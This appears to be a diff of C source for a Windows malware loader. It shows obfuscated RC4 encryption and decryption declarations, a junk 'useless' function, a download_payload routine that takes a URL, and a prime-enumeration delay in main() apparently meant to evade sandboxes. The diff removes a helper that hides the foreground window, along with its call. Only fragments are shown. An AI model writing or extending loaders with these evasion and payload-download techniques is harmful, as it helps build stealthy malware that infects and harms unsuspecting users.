@@ -12,13 +12,6 @@ void obfuscated_encrypt(unsigned char* data, size_t data_len, unsigned char* key
 // RC4 decryption function (obfuscated)
 void obfuscated_decrypt(unsigned char* data, size_t data_len, unsigned char* key);
 
-// Function to hide window (obfuscated)
-void obfuscate_window() {
-    HWND hwnd = GetForegroundWindow();
-    if (hwnd) {
-        ShowWindow(hwnd, SW_HIDE);
-    }
-}
 
 // Useless function
 void useless_function() {
@@ -139,8 +132,6 @@ unsigned char* download_payload(const wchar_t* url, size_t* payload_size) {
 }
 
 int main(int argc, char* argv[]) {
-    // Hide the window
-    obfuscate_window();
 
     //Delay execution by enumerating primes
     delay_execution();
